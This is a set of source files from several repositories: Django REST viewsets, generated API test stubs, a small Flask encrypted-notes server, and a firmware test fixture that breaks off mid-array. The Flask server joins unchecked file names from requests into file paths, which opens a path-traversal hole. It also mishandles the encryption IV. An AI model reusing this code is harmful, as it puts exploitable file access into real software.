)\n    paginate_by = 25\n    paginate_by_param = 'page_size'\n    max_paginate_by = 100\n    filter_backends = (\n        #filters.DjangoFilterBackend,\n        filters.SearchFilter,\n        filters.OrderingFilter,\n    )\n\n\nclass SprintViewSet(DefaultsMixin, viewsets.ModelViewSet):\n    \"\"\"API endpoint for listing and creating sprints.\"\"\"\n\n    queryset = Sprint.objects.order_by('end')\n    serializer_class = SprintSerializer\n    filter_class = SprintFilter\n    search_fields = ('name',)\n    ordering_fields = ('end', 'name',)\n\n\nclass TaskViewSet(DefaultsMixin, viewsets.ModelViewSet):\n    \"\"\"API endpoint for listing and creating tasks.\"\"\"\n\n    queryset = Task.objects.all()\n    serializer_class = TaskSerializer\n    filter_class = TaskFilter\n    search_fields = ('name', 'description',)\n    ordering_fields = ('name', 'order', 'started', 'due', 'completed',)\n\n\nclass UserViewSet(DefaultsMixin, viewsets.ReadOnlyModelViewSet):\n    \"\"\"API endpoint for listing users.\"\"\"\n\n    lookup_field = User.USERNAME_FIELD\n    lookup_url_kwarg = User.USERNAME_FIELD\n    queryset = User.objects.order_by(User.USERNAME_FIELD)\n    serializer_class = UserSerializer\n    search_fields = (User.USERNAME_FIELD,)\n"}
{"blob_id": "6b8ed594d7010e2c8bdc88e05eaafdead4a82e25", "directory_id": "e97e727972149063b3a1e56b38961d0f2f30ed95", "path": "/test/test_dispositions_api.py", "content_id": "72054a85865322636021709bc99a39b437ac9845", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "knetikmedia/knetikcloud-python-client", "snapshot_id": "f3a485f21c6f3e733a864194c9acf048943dece7", "revision_id": "834a24415385c906732437970db105e1bc71bde4", "branch_name": "refs/heads/master", "visit_date": "2021-01-12 10:23:35.307479", "revision_date": "2018-03-14 16:04:24", "committer_date": "2018-03-14 16:04:24", "github_id": "76418830", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1570", "extension": "py", "content": "# coding: utf-8\n\n\"\"\"\n    Knetik Platform API Documentation latest \n\n    This is the spec for the Knetik API.  Use this in conjunction with the documentation found at https://knetikcloud.com.\n\n    OpenAPI spec version: latest \n    Contact: support@knetik.com\n    Generated by: https://github.com/swagger-api/swagger-codegen.git\n\"\"\"\n\n\nfrom __future__ import absolute_import\n\nimport os\nimport sys\nimport unittest\n\nimport knetik_cloud\nfrom knetik_cloud.rest import ApiException\nfrom knetik_cloud.apis.dispositions_api import DispositionsApi\n\n\nclass TestDispositionsApi(unittest.TestCase):\n    \"\"\" DispositionsApi unit test stubs \"\"\"\n\n    def setUp(self):\n        self.api = knetik_cloud.apis.dispositions_api.DispositionsApi()\n\n    def tearDown(self):\n        pass\n\n    def test_add_disposition(self):\n        \"\"\"\n        Test case for add_disposition\n\n        Add a new disposition\n        \"\"\"\n        pass\n\n    def test_delete_disposition(self):\n        \"\"\"\n        Test case for delete_disposition\n\n        Delete a disposition\n        \"\"\"\n        pass\n\n    def test_get_disposition(self):\n        \"\"\"\n        Test case for get_disposition\n\n        Returns a disposition\n        \"\"\"\n        pass\n\n    def test_get_disposition_counts(self):\n        \"\"\"\n        Test case for get_disposition_counts\n\n        Returns a list of disposition counts\n        \"\"\"\n        pass\n\n    def test_get_dispositions(self):\n        \"\"\"\n        Test case for get_dispositions\n\n        Returns a page of dispositions\n        \"\"\"\n        pass\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"blob_id": "cdaa0d3dd52dfcb7677fe430e333fe2c16cdc7aa", "directory_id": "1f835e985ebf24c156a4d8347c31f388b35b8213", "path": "/server/api.py", "content_id": "e93d356a64277bd871774e4fcf9923ee50f8e85a", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "HALLERPierre/crypto_notes", "snapshot_id": "f91a48e422bd745474dce015973f844f620f587d", "revision_id": "269d9542093ebce9377474dad0a96fbdc63fbc6a", "branch_name": "refs/heads/master", "visit_date": "2020-12-30 14:33:29.969004", "revision_date": "2017-07-11 22:47:05", "committer_date": "2017-07-11 22:47:05", "github_id": "91320390", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2019-07-12 16:27:21", "gha_created_at": "2017-05-15 09:35:22", "gha_language": "JavaScript", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2682", "extension": "py", "content": "from utils import *\nimport crypto\nimport time\nimport json\nimport sys\nimport os\nimport flask\n\n\nkey = None\nconnected = False\n\ndef routes(app):\n\t\"\"\"\n\tLimit connection to localhost\n\t\"\"\"\n\t@app.before_request\n\tdef limit_remot_addr():\n\t\tif flask.request.remote_addr != '127.0.0.1':\n\t\t\tabort(403)\n\t\n\t\"\"\"\n\tFetch private key (user own this key).\n\tLater, this key should be crypted with a key stored in DB (we'll own this key)\n\tTODO : deco\n\t\"\"\"\n\t@app.route('/api/connect', methods=['GET'])\n\tdef connect():\n\t\tglobal key\n\t\tkey = crypto.getPrivateKey()\n\t\tif key:\n\t\t\tresp = getResponse(\"Connection ok\", 200)\n\t\t\tconnected = True\n\t\telse :\n\t\t\tresp = getResponse(\"Connection failed\", 500)\n\t\treturn resp\n\t\n\t\"\"\"\n\tDecrypt a message, the crypted message is stored in a file (Maybe change that ?)\n\tGET or POST ?\n\t\"\"\"\n\t@app.route('/api/decrypt/<string:fileName>', methods=['GET'])\n\tdef decrypt(fileName):\n\t\t#TODO : HANDLE IF FILE NO EXIST\n\t\t#See if notes should be stored or use another method\n\t\tpath = 'notes/' + fileName\n\t\twith open(path, 'rb') as cryptedFile:\n\t\t\tprint(path, file=sys.stderr)\n\t\t\tmsg = cryptedFile.read()\n\t\t#TODO : get this message IV\n\t\ttry:\n\t\t\tiv = crypto.getIV()\n\t\t\tcipher = crypto.getCipher(key, iv)\n\t\t\tdecryptedMsg = crypto.decryptMessage(cipher, iv, msg)\n\t\t\tresp = getResponse(decryptedMsg, 200)\n\t\texcept Exception:\n\t\t\tresp = getResponse(\"Fail during decryp message\", 500)\n\t\treturn resp\n\t\n\t\"\"\"\n\tCrypt a message and store it with a timestamp (change that too)\n\tGET or POST ?\n\t\"\"\"\n\t@app.route('/api/encrypt', methods=['POST'])\n\tdef encrypt():\n\t\t#TODO : generate and stock this message IV\n\t\tpostData = flask.request.data.decode(\"utf-8\")\n\t\tpostData = json.loads(postData)\n\t\ttitle = postData['title']\n\t\tmsg = postData['note']\n\t\ttry :\n\t\t\tiv = crypto.getIV()\n\t\t\tcipher = crypto.getCipher(key, iv)\n\t\t\tcryptedMsg = crypto.encryptMessage(cipher, iv, msg)\n\t\t\tstoreMessage(cryptedMsg, title)\n\t\t\tresp = getResponse(\"Message encrypted and stored\", 200)\n\t\texcept Exception:\n\t\t\tresp = getResponse(\"Fail during encrypt message\", 500)\n\t\treturn resp\n\t\n\t\"\"\"\n\tGet all titles in note directory.\n\tThe goal is to have a DB later and not use this\n\t\"\"\"\n\t@app.route('/api/getAllTitles', methods=['GET'])\n\tdef getAllTitles():\n\t\ttitles = []\n\t\tif not os.path.isdir('notes'):\n\t\t\treturn getResponse(\"Dir does not exist :(\", 500)\n\t\tfor filename in os.listdir('notes'):\n\t\t\ttitles.append(filename)\n\t\treturn getResponse(json.dumps(titles), 200)\n\t\n\t\n\t\n\tdef storeMessage(cryptedMsg, fileName= None):\n\t\tif not fileName:\n\t\t\tfileName = time.strftime(\"%H_%M_%S\")+\".crn\"\n\t\tpath = 'notes/' + fileName\n\t\tos.makedirs(os.path.dirname(path), exist_ok=True)\n\t\twith open(path, 'wb') as fileCrypted :\n\t\t\tfileCrypted.write(cryptedMsg)\n\t"}
{"blob_id": "4c4461b56f9fddd8eee818da92c1bd0178c1dd7b", "directory_id": "899ccd7d0c9c3c0a7aec9cd72f5a30cc8673b1ee", "path": "/tests/test_firmware.py", "content_id": "ead2487a446d57f302ef1eab90a58e06cbdcd57c", "detected_licenses": "['LicenseRef-scancode-warranty-disclaimer', 'MIT', 'BSD-2-Clause-Patent', 'Apache-2.0']", "license_type": "permissive", "repo_name": "kkdao/krux", "snapshot_id": "1c207a08644244c30cd6ced33ceee6a6d575b3fc", "revision_id": "1c6ec0c956a3e973a1176b51cc0f6d9eb0137aa5", "branch_name": "refs/heads/main", "visit_date": "2023-08-07 21:21:26.423091", "revision_date": "2022-09-13 05:30:02", "committer_date": "2022-09-13 05:30:02", "github_id": "403701683", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "NOASSERTION", "gha_event_created_at": "2021-09-06 17:08:45", "gha_created_at": "2021-09-06 17:08:44", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "204068", "extension": "py", "content": "import pytest\nfrom .shared_mocks import get_mock_open\n\n\n@pytest.fixture\ndef tdata(mocker):\n    import os\n    from collections import namedtuple\n    from embit import ec\n    from krux.firmware import FIRMWARE_SLOT_1, FIRMWARE_SLOT_2\n\n    TEST_SIGNER_PUBKEY = (\n        \"03dc8ffc42845af7a30be30e7fc342363f43bc6d11a6c1d833e4e2fc339a1d0491\"\n    )\n    TEST_SIGNER_PUBLIC_KEY = ec.PublicKey.from_string(TEST_SIGNER_PUBKEY)\n\n    TEST_FIRMWARE_FILENAME = os.path.join(\n        os.path.dirname(__file__), \"firmware-v0.0.0.bin\"\n    )\n    TEST_FIRMWARE = open(TEST_FIRMWARE_FILENAME, \"rb\").read()\n    TEST_FIRMWARE_SHA256 = open(TEST_FIRMWARE_FILENAME + \".sha256.txt\", \"r\").read()\n    TEST_FIRMWARE_WITH_HEADER_SHA256 = open(\n        TEST_FIRMWARE_FILENAME + \".withheader.sha256.txt\", \"r\"\n    ).read()\n    TEST_FIRMWARE_SIG = open(TEST_FIRMWARE_FILENAME + \".sig\", \"rb\").read()\n    TEST_FIRMWARE_SIGNATURE = ec.Signature.parse(TEST_FIRMWARE_SIG)\n    TEST_FIRMWARE_MALFORMED_SIG = open(\n        TEST_FIRMWARE_FILENAME + \".malformed.sig\", \"rb\"\n    ).read()\n    TEST_FIRMWARE_BAD_SIG = open(TEST_FIRMWARE_FILENAME + \".bad.sig\", \"rb\").read()\n\n    SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1 = [\n        0x5A,\n        0xA5,\n        0xD0,\n        0xC4,\n        0x00,\n        0x08,\n        0x00,\n        0x00,\n        0x00,\n        0x01,\n        0x2D,\n        0xC0,\n        0x3C,\n        0x90,\n        0x9C,\n        0x36,\n        0x64,\n        0x76,\n        0x70,\n        0x5F,\n        0x6F,\n        0x76,\n        0x20,\n        0x65,\n        0x78,\n        0x61,\n        0x6D,\n        0x70,\n        0x6C,\n        0x65,\n        0x00,\n        0x00,\n        0x5A,\n        0xA5,\n        0xD0,\n        0xC5,\n        0x00,\n        0x08,\n        0x00,\n        0x00,\n        0x00,\n        0x1A,\n        0xA0,\n        0x00,\n        0x24,\n        0xC6,\n        0xAB,\n        0xAA,\n        0x4D,\n        0x69,\n        0x63,\n        0x72,\n        0x6F,\n        0x50,\n        0x79,\n        0x74,\n        0x68,\n        0x6F,\n        0x6E,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x5A,\n        0xA5,\n        0xD0,\n        0xC4,\n        0x00,\n        0x28,\n        0x00,\n        0x00,\n        0x00,\n        0x19,\n        0xA9,\n        0xC0,\n        0x3C,\n        0x90,\n        0x9C,\n        0x36,\n        0x6D,\n        0x61,\n        0x69,\n        0x78,\n        0x70,\n        0x79,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x5A,\n        0xA5,\n        0xD0,\n        0xCF,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        